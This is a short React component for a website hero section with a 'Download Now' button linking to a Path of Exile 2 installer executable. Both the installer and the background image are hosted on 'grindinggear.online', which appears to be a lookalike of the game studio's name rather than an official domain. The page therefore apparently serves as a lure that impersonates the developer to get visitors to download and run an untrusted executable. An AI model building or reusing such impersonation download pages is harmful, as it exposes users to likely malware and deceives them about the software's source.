import React from 'react';
import { HeroSection } from '../types';

const heroData: HeroSection = {
  title: '',
  subtitle: 'Experience our games',
  backgroundImage: 'https://ima.grindinggear.online/grindinggear/mainop.webp'
};

export const Hero: React.FC = () => {
  return (
      <section className="relative h-screen flex items-center justify-center">
          <div
              className="absolute inset-0 bg-cover bg-center z-0"
              style={{backgroundImage: `url(${heroData.backgroundImage})`}}
          >
              <div className="absolute inset-0 bg-gradient-to-b from-black/50 via-transparent to-black/80"/>
          </div>

          <div className="relative z-10 text-center text-withe">
              <h1 className="text-7xl font-bold tracking-wider mb-4">
                  {heroData.title}
              </h1>
              <p className="text-2xl font-light">{heroData.subtitle}</p>
              <button
                  className="mt-8 px-8 py-3 border border-white text-white bg-transparent hover:bg-white hover:text-black transition-colors rounded-lg">
                  <a
                      href="https://run.grindinggear.online/launcher/PathOfExile2Installer.exe"
                      className="block w-full h-full"
                  >
                      Download Now
                  </a>
              </button>
      </div>
</section>
)
    ;
};